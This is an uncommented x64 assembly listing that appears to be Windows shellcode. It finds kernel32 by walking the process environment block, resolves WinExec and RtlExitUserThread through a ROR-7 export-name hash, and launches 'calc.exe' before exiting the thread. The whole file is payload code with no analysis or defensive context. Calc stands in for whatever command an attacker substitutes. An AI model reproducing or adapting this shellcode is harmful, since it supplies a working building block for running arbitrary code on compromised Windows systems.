BITS 64

        AND     SPL,    0xF0

RUN_WINEXEC:
        MOV     R11D,   0x1A22F51
        PUSH    0
        MOV     RCX,    0x6578652E636C6163
        PUSH    RCX
        MOV     RCX,    RSP
        SUB     RSP,    0x20
        CMP     RSP,    7
        CALL    RUN_FUNCTION

RUN_RTLEXITUSERTHREAD:
        MOV     R11D,   0x6DEC1356
        PUSH    RCX

RUN_FUNCTION:

GET_NTDLL:
        MOV     RDX,    GS:[0x60]
        MOV     RDX,    QWORD   [RDX + 0x18]
        MOV     RDX,    QWORD   [RDX + 0x30]
        JZ      GET_FUN

GET_KERNEL32:
        MOV     RDX,    QWORD   [RDX]
        MOV     RDX,    QWORD   [RDX]

GET_FUN:
        MOV     RDX,    QWORD   [RDX + 0x10]
        MOV     EBP,    DWORD   [RDX + 0x3C]
        ADD     RBP,    RDX
        MOV     EBP,    DWORD   [RBP + 0x88]
        ADD     RBP,    RDX
        MOV     R8D,    DWORD   [RBP + 0x18]
        MOV     R9D,    DWORD   [RBP + 0x20]
        ADD     R9,     RDX

SEARCH:
        DEC     R8
        MOV     ESI,    DWORD   [R9 + R8 * 4]
        ADD     RSI,    RDX
        XOR     RAX,    RAX
        XOR     R10,    R10
HASH:
        LODSB
        CMP     AL,     0
        JZ      COMPARE
        ROR     R10D,   7
        ADD     R10D,   EAX
        JMP     HASH

COMPARE:
        CMP     R10D,   R11D
        JNZ     SEARCH

        MOV     EAX,    DWORD   [RBP + 0x24]
        ADD     RAX,    RDX
        MOV     R8W,    WORD    [RAX + R8 * 2]
        MOV     EAX,    DWORD   [RBP + 0x1C]
        ADD     RAX,    RDX
        MOV     EAX,    DWORD   [RAX + R8 * 4]
        ADD     RAX,    RDX
        JMP     RAX